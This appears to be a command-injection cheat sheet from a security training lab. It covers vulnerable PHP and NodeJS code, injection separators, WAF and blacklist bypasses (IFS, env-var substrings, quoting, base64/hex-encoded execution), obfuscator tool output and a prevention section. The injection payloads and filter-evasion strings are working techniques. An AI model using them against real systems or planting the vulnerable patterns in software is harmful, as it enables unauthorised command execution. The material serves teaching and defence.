### Content

- [Injection Characters](#injection-characters)
- [Space Bypass](#space-bypass)
- [Substring Technique](#substring-technique)
	- [Linux](#linux)
	- [Windows](#windows)
- [Character Bypass](#character-bypass)
- [Obfuscation Techniques](#obfuscation-techniques)
	- [Ignored Chars](#ignored-chars)
	- [Case Manipulation](#case-manipulation)
	- [Reversed Commands](#reversed-commands)
	- [Encoded Commands](#encoded-commands)
- [Tools](#tools)
- [Prevention](#prevention)
	- [Avoid System Commands](#avoid-system-commands)
	- [Input Validation](#input-validation)
	- [Input Sanitization](#input-sanitization)
	- [Server Configuration](#server-configuration)

> [!Note]
> For mor evasion techniques [PayloadsAllTheThings/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
> 
> 

---
###### PHP vulnerable code

A web application written in `PHP` may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands directly on the back-end server.

```PHP
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

###### NodeJS vulnerable code

a web application is written in `NodeJS` may use `child_process.exec` or `child_process.spawn` functions to execute commands directly on the back-end server.

```JS
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

###### Blacklist with PHP code

``` PHP
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
	if (strpos($_POST['ip'], $character) !== false) {
		echo "Invalid input";
	}
}
$commands_blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($commands_blacklist as $word) {
	if (strpos('$_POST['ip']', $word) !== false) {
		echo "Invalid input";
	}
}
```

- If the error message displayed in field where the output is displayed, That mean it has been detected by the backend language like `PHP`.
- If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.

---
#### Injection Characters

| **Injection Character** | **URL-Encoded Character** | **Executed Command**                       | Restrictions            |
| ----------------------- | ------------------------- | ------------------------------------------ | ----------------------- |
| ;                       | %3b                       | Both                                       | Not working in CMD      |
| \n                      | %0a                       | Both                                       |                         |
| &                       | %26                       | Both (second output generally shown first) |                         |
| \|                      | %7c                       | Both (only second output is shown)         |                         |
| &&                      | %26%26                    | Both (only if first succeeds)              |                         |
| \|\|                    | %7c%7c                    | Second (only if first fails)               |                         |
| ``                      | %60%60                    | Both                                       | Sub-Shell for Unix-Only |
| $()                     | %24%28%29                 | Both                                       | Sub-Shell for Unix-Only |

> [!Notes]
> - `\n` on burp suite gets URL-Encoded as separate characters to `%5C%6E`
> - Try to replace spaces with tabs (`%09`)
> - Use `<<<` to avoid using a pipe `|`

---
#### Space Bypass

- If the space character is blacklisted even if it's encoded `+`, Try:
	- `%09` tabs (Works on Linux and Windows). `127.0.0.1%0a%09`
	- `${IFS}` Linux Environment Variable may also work since its default value is a space and a tab. `127.0.0.1%0a${IFS}`
	- `Bash Brace Expansion`, which automatically adds spaces between arguments wrapped between braces. `127.0.0.1%0a{ls,-la}`

> Check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

---
#### Substring Technique

We can use a substring from an environment variable if typing that substring directly is blacklisted:

##### Linux

- Print all env vars with the command `printenv`, Example: `127.0.0.1%0a${IFS}printenv`
	- Specifying `start` index and `length` for substring.
	- `${PATH:0:1}` will be `/`, Ex: `127.0.0.1%0als${IFS}${PATH:0:1}` to list the root directory.
	- Suppose that `${LS_COLORS:10:1}` will be `;` after injecting `printenv` command.
		- Then `127.0.0.1${LS_COLORS:10:1}${IFS}` will result in `127.0.0.1; `

##### Windows

- `CMD`: Use `SET` command to list all env vars.
	- we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\comp-user`)
		- Specify a starting position (`~6` -> `\comp`)
		- Specify a negative end position, which in this case is the length of the username `comp-user` (`-9` -> `\`)
		- Or we can specify the number of characters to include `-1`
	- `echo %HOMEPATH:~6,-9%` will result in `\`
	- `echo %HOMEPATH:~6,1%` will result in `\`
- `PowerShell`: Use `Get-ChildItem env:` to list all env vars.
	- A word in `Powershell` is considered an array, so we can specify the index of the character we need.
		- `$env:HOMEPATH[0]` will result in `\`

---
#### Character Bypass

Science every character has its own ascii code, Write a specific character with intention to change its ascii value to become another character when processed.

- Linux (Shifting characters by 1) 

``` bash
$ man ascii     # To display the ascii table
$ echo $(tr '!-}' '"-~'<<<[) # [ (ascii:133) will become \ (ascii:134) 
$ echo $(tr '!-}' '"-~'<<<:) # : (ascii:72) will become ; (ascii:73)
$ echo $(tr '!-}' '"-~'<<<.) # . will become /
```

- Windows (Shifting character by 1)

``` Powershell
PS C:\Users\user> [char](([int][char]'[') + 1) # [ (ascii:133) will become \ (ascii:134) 
PS C:\Users\user> [char](([int][char]':') + 1) # : (ascii:72) will become ; (ascii:73)
```

---
#### Obfuscation Techniques

###### Ignored Chars

- Linux & Windows (Bash and PowerShell)
	-  Characters like `'`, `"`, Example: `whoami` = `w'h'o'am'i` = `w"h"o"am"i`
	- Don't mix type of quotes.
	- The number of quotes must be even.
- Linux
	- Characters like `\`, `$@`, Example: `whoami` = `who$@ami` = `w\ho\am\i`
- Windows
	- Characters like the caret: `^`, Example: `whoami` = `who^ami`

###### Case Manipulation

- Linux (Don't forget to replace spaces if they are blocked)
	- Commands for Bash are case-sensitive, workarounds: 
		- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
			- Payload ex: `ip=localhost%0a$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")`
		- `$(a="WhOaMi";printf %s "${a,,}")`
			- Payload ex: `ip=localhost%0a$(a="WhOaMi"%0aprintf%09%s%09"${a,,}")`
- Windows (PowerShell and CMD)
	- Commands for PowerShell and CMD are case-insensitive, Example: `WhOaMi`= `WHOAMI`

###### Reversed Commands

- Linux
	- To reverse a command string `echo 'whoami' | rev`
	- Execute a reversed command `$(rev<<<'imaohw')`
- Windows
	- To reverse a command string `"whoami"[-1..-20] -join ''`
	- Execute a reversed command with PowerShell sub-shell `iex "$('imaohw'[-1..-20] -join '')"`

###### Encoded Commands

- Linux
	- b64 encoding then decode and execute using `base64` and `openssl`
		- ``echo -n 'whoami' | base64``
			- `bash<<<$(base64 -d<<<d2hvYW1p)`
			- `bash<<<$(openssl base64 -d<<<d2hvYW1p)`
		- convert the string from `utf-8` to `utf-16` before we convert it to `base64`: 
		  `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`
			- `bash<<<$(base64 -d<<<dwBoAG8AYQBtAGkA)`
			- `bash<<<$(openssl base64 -d<<<dwBoAG8AYQBtAGkA)`
	- Hex encoding with `xxd`
		- `echo -n 'whoami' | xxd -p`
			- `bash<<<$(xxd -r -p<<<'77686f616d69')`
	- Combine b64 encoding with Hex encoding
		1. Encode the original command in Base64: `echo -n 'whoami' | base64`
		2. Encode the Base64 output in Hex: `echo -n 'd2hvYW1p' | xxd -p`
		3. Decode and Execute: `bash<<<$(base64 -d<<<$(xxd -r -p<<<'6432687659573170'))`
- Windows
	- b64 encoding
		- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
			- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

---
#### Tools

- Linux ([Bashfuscator](https://github.com/Bashfuscator/Bashfuscator))

``` bash
$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ pip3 install setuptools==65
$ python3 -m pip install .
$ ./bashfuscator -c 'cat /etc/passwd'
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
# Test the outputted command with bash -c ''
$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

- Windows ([DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation))

``` bash
PS > git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS > cd Invoke-DOSfuscation
PS > Import-Module .\Invoke-DOSfuscation.psd1
PS > Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\...SNIP...
```

---
#### Prevention

##### Avoid System Commands

Instead of using system command execution functions, use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities.

> EX: Test whether a particular host is alive with `PHP` using `fsockopen` function instead, which should not be exploitable to execute arbitrary system commands.
##### Input Validation

- Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match. 
- Input validation should be done both on the front-end and on the back-end.

IP validation in different languages may look like:

```PHP
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

```JS
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

##### Input Sanitization

Sanitization means removing any non-necessary special characters from the user input. Input sanitization is always performed after input validation.

Use `preg_replace` to remove any special characters from the user input in PHP:

```PHP
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

Use `replace` in JS:

```JS
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

Use `DOMPurify` library for a `NodeJS` back-end:

```JS
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

> Escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques.
##### Server Configuration

- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
- Reject double-encoded requests and non-ASCII characters in URLs
- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))